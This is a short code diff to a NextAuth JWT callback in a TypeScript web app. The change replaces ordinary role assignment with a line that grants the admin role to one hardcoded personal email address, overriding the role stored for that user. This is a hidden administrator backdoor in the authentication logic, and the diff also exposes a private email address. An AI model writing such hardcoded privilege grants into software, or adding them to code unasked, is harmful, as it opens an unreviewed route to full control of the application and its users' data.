@@ -45,7 +45,8 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
             if (user) {
                 token.id = user.id;
                 token.planId = (user as { planId?: string }).planId || "free";
-                token.role = (user as { role?: string }).role || "user";
+                const userRole = (user as { role?: string }).role || "user";
+                token.role = user.email === "hengkikemute@gmail.com" ? "admin" : userRole;
             }
             return token;
         },
